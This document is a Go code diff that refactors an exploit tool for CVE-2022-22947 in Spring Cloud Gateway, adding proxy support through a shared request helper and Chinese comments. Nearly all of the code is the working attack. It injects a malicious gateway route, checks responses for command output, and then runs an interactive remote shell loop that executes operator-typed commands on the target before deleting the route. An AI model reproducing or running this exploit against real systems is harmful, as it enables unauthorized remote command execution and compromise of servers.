@@ -4,19 +4,18 @@ import (
 	"bufio"
 	"fmt"
 	"github.com/fatih/color"
-	"io/ioutil"
-	"net/http"
 	"os"
 	"ssp/common"
 	"strings"
-	"time"
 )
 
-func CVE_2022_22947(url string) {
+func CVE_2022_22947(url string, proxyURL string) {
 
+	// 定义API的端点
 	endpoint1 := "actuator/gateway/routes/hacktest"
 	endpoint2 := "actuator/gateway/refresh"
 
+	// 设置请求头
 	oldHeader1 := map[string]string{
 		"Accept-Encoding": "gzip, deflate",
 		"Accept":          "*/*",
@@ -30,9 +29,11 @@ func CVE_2022_22947(url string) {
 		"Content-Type": "application/x-www-form-urlencoded",
 	}
 
+	// 合并请求头
 	headers1 := common.MergeHeaders(oldHeader1)
 	headers2 := common.MergeHeaders(oldHeader2)
 
+	// 设置payload
 	payload := `{
               "id": "hacktest",
               "filters": [{
@@ -53,137 +54,98 @@ func CVE_2022_22947(url string) {
               "order": 0
             }`
 
-	client := &http.Client{
-		Timeout: 10 * time.Second,
-	}
-
+	// 使用 MakeRequest 发送 POST 请求
 	urltest := url + endpoint1
-	req1, err := http.NewRequest("POST", urltest, strings.NewReader(payload))
+	resp1, body, err := common.MakeRequest(urltest, "POST", proxyURL, headers1, payload)
 	if err != nil {
 		fmt.Println("Error creating request:", err)
 		return
 	}
-	for key, value := range headers1 {
-		req1.Header.Set(key, value)
-	}
-	resp1, err := client.Do(req1)
-	if err != nil {
-		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
-		return
-	}
+
 	defer resp1.Body.Close()
+	// 打印响应体内容
+	fmt.Println("响应内容:", string(body))
 
-	_, err = ioutil.ReadAll(resp1.Body)
-	if err != nil {
-		fmt.Println("Error reading response:", err)
-		return
-	}
-
+	// 刷新API
 	refreshURL := url + endpoint2
-	req2, err := http.NewRequest("POST", refreshURL, nil)
+	_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
 	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return
-	}
-	for key, value := range headers2 {
-		req2.Header.Set(key, value)
-	}
-	_, err = client.Do(req2)
-	if err != nil {
-		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+		color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 		return
 	}
 
+	// 获取路由数据
 	routesURL := url + endpoint1
-	req3, err := http.NewRequest("GET", routesURL, nil)
+	resp3, body, err := common.MakeRequest(routesURL, "GET", proxyURL, headers2, "")
 	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return
-	}
-	for key, value := range headers2 {
-		req3.Header.Set(key, value)
-	}
-	resp3, err := client.Do(req3)
-	if err != nil {
-		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+		color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 		return
 	}
 	defer resp3.Body.Close()
 
-	body, err := ioutil.ReadAll(resp3.Body)
-	if err != nil {
-		fmt.Println("Error reading response:", err)
-		return
-	}
+	// 打印路由响应体内容
+	fmt.Println("路由响应内容:", string(body))
 
+	// 判断是否存在漏洞回显
 	if strings.Contains(string(body), "uid=") && strings.Contains(string(body), "gid=") && strings.Contains(string(body), "groups=") {
+		// 输出漏洞确认
 		common.PrintVulnerabilityConfirmation("CVE-2022-22947", url, "Null", "3")
-		color.Red("[+] Payload已经输出，回显结果如下：")
+		color.Red("[+] Payload回显如下：")
 		res := common.ExtractResult(string(body), `s*'([^']*)'`)
 		result := strings.Replace(res, "\\n", "\n", -1)
 		fmt.Println(result)
+
+		// 开始交互式命令执行
 		for {
 			var Cmd string
 			reader := bufio.NewReader(os.Stdin)
 
+			// 提示用户输入命令
 			fmt.Print("shell > ")
 			Cmd, _ = reader.ReadString('\n')
 			Cmd = strings.TrimSpace(Cmd)
+
+			// 如果输入exit，则退出
 			if Cmd == "exit" {
-				req4, err := http.NewRequest("DELETE", urltest, nil)
+				// 删除恶意路由
+				_, _, err := common.MakeRequest(urltest, "DELETE", proxyURL, headers2, "")
 				if err != nil {
-					fmt.Println("Error creating request:", err)
-					return
-				}
-				for key, value := range headers2 {
-					req4.Header.Set(key, value)
-				}
-				_, err = client.Do(req4)
-				if err != nil {
-					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 					return
 				}
 
-				_, err = client.Do(req2)
+				// 发送刷新请求
+				_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
 				if err != nil {
-					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 					return
 				}
 				os.Exit(0)
 			} else {
+				// 执行用户输入的命令
 				payload3 := strings.ReplaceAll(payload2, "whoami", Cmd)
-				req1, err := http.NewRequest("POST", urltest, strings.NewReader(payload3))
+				_, _, err := common.MakeRequest(urltest, "POST", proxyURL, headers1, payload3)
 				if err != nil {
-					fmt.Println("Error creating request:", err)
-					return
-				}
-				for key, value := range headers1 {
-					req1.Header.Set(key, value)
-				}
-				_, err = client.Do(req1)
-				if err != nil {
-					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 					return
 				}
 
-				_, err = client.Do(req2)
+				// 发送刷新请求
+				_, _, err = common.MakeRequest(refreshURL, "POST", proxyURL, headers2, "")
 				if err != nil {
-					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 					return
 				}
 
-				resp3, err := client.Do(req3)
+				// 获取路由数据
+				resp3, body, err := common.MakeRequest(routesURL, "GET", proxyURL, headers2, "")
 				if err != nil {
-					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
+					color.Yellow("[-] URL为：%s，目标拒绝请求，跳过\n", url)
 					return
 				}
 				defer resp3.Body.Close()
 
-				body, err := ioutil.ReadAll(resp3.Body)
-				if err != nil {
-					fmt.Println("Error reading response:", err)
-					return
-				}
+				// 打印命令执行结果
 				res := common.ExtractResult(string(body), `s*'([^']*)'`)
 				result := strings.Replace(res, "\\n", "\n", -1)
 				fmt.Println(result)
